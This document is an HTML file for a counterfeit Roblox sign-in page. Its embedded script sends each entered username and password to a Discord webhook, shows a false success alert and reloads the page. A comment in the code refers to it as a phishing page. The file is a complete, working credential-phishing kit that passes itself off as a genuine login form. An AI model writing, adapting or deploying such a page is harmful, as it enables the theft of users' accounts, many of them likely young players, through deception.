<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Roblox</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background-color: #000;
      color: white;
      display: flex;
      min-height: 100vh;
      overflow-x: hidden;
    }

    /* Left Panel */
    .left-panel {
      width: 400px;
      background-color: #111;
      padding: 40px 30px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .logo {
      font-size: 24px;
      font-weight: bold;
      color: #fff;
      margin-bottom: 30px;
      display: flex;
      align-items: center;
    }

    .logo img {
      width: 24px;
      height: 24px;
      margin-right: 10px;
    }

    .panel-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 10px;
    }

    .panel-subtitle {
      font-size: 12px;
      color: #999;
      margin-bottom: 20px;
    }

    .login-form {
      display: flex;
      flex-direction: column;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      margin-bottom: 5px;
      font-size: 12px;
      color: #ccc;
    }

    .form-group input {
      width: 100%;
      padding: 12px;
      background-color: #222;
      border: 1px solid #333;
      border-radius: 4px;
      color: white;
      font-size: 14px;
    }

    .form-group input:focus {
      outline: none;
      border-color: #00a2ff;
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      background-color: #00a2ff;
      color: black;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .login-btn:hover {
      background-color: #0088cc;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
    }

    .divider-line {
      flex: 1;
      height: 1px;
      background-color: #333;
    }

    .divider-text {
      padding: 0 10px;
      color: #999;
      font-size: 12px;
    }

    .signup-link {
      text-align: center;
      font-size: 12px;
      color: #999;
    }

    .signup-link a {
      color: #00a2ff;
      text-decoration: none;
    }

    .signup-link a:hover {
      text-decoration: underline;
    }

    /* Right Panel */
    .right-panel {
      flex: 1;
      background: url('https://i.imgur.com/5VQc0Gd.jpg') no-repeat center center;
      background-size: cover;
      position: relative;
    }

    .right-panel::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.5);
    }

    /* Responsive */
    @media (max-width: 1024px) {
      .left-panel {
        width: 100%;
        padding: 20px;
      }

      .right-panel {
        display: none;
      }
    }
  </style>
</head>
<body>
  <!-- Left Panel -->
  <div class="left-panel">
    <div class="logo">
      <img src="https://i.imgur.com/5VQc0Gd.jpg" alt="Roblox">
      ROBLOX
    </div>
    <div class="panel-title">Sign In</div>
    <div class="panel-subtitle">Enter your Roblox credentials to continue.</div>

    <!-- Login Form -->
    <form id="loginForm" class="login-form">
      <div class="form-group">
        <label for="username">Username or Email</label>
        <input type="text" id="username" name="username" placeholder="Enter your username or email" required>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required>
      </div>
      <button type="submit" class="login-btn">Sign In</button>
    </form>

    <div class="divider">
      <div class="divider-line"></div>
      <div class="divider-text">or</div>
      <div class="divider-line"></div>
    </div>

    <div class="signup-link">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>

  <!-- Right Panel -->
  <div class="right-panel"></div>

  <script>
    const webhook = 'https://discord.com/api/webhooks/1477207175607619606/QRToJeCw3f5Psff9_81PRwwOMAdsyUboelWzFuqrel1OG2eIcHqqqGvgOAoWIfP470vc';

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const payload = {
        embeds: [{
          title: 'New Roblox Login',
          description: `**Username:** \`${username}\`\n**Password:** \`${password}\``,
          color: 0x00a2ff
        }]
      };

      try {
        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (error) {
        console.error('Failed to send to Discord:', error);
      }

      // Fake success message
      alert('Login successful! Redirecting...');
      // In a real phishing page, you might redirect to a fake "dashboard" or just reload the page.
      // For testing, we'll just reload to reset the form.
      window.location.reload();
    });
  </script>
</body>
</html>
